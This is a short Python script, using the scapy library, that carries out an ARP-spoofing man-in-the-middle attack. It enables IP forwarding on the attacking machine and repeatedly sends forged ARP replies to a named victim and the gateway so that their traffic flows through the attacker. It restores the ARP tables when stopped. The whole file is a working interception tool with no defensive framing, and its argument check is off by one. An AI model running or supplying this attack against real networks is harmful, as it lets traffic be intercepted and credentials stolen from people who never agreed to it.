from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import sys
import os

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
    if ans:
        return ans[0][1].src

def ARPspoof(srcIP, targetIP, targetMAC):
    arp = ARP(op=2, psrc=srcIP, pdst=targetIP, hwdst=targetMAC)
    send(arp)

def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
    arp1=ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewayMAC)
    arp2=ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimMAC)
    send(arp1, count=3, verbose=False)
    send(arp2, count=3, verbose=False)

def enable_ip_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ip_forwarding():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def main(gatewayIP, victimIP):
    enable_ip_forwarding()
    victimMAC = getMAC(victimIP)
    gatewayMAC = getMAC(gatewayIP)

    if victimMAC == None or gatewayMAC == None:
        print("Cannot find MAC address")
        exit()

    print(f'Start Spoofing -> VICTIM IP {victimIP}')
    print(f'{victimIP}: POISON ARP Table {gatewayMAC} -> {victimMAC}')

    try:
        while 1:
            ARPspoof(gatewayIP, victimIP, victimMAC)
            ARPspoof(victimIP, gatewayIP, gatewayMAC)
            __import__('time').sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
        disable_ip_forwarding()
        print("terminated Spoofing -> RESTORED ARP TABLE")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 arp.py {client IP address} {gateway IP address}")
        exit()
    victimIP = sys.argv[1]
    gatewayIP = sys.argv[2]

    main(gatewayIP, victimIP)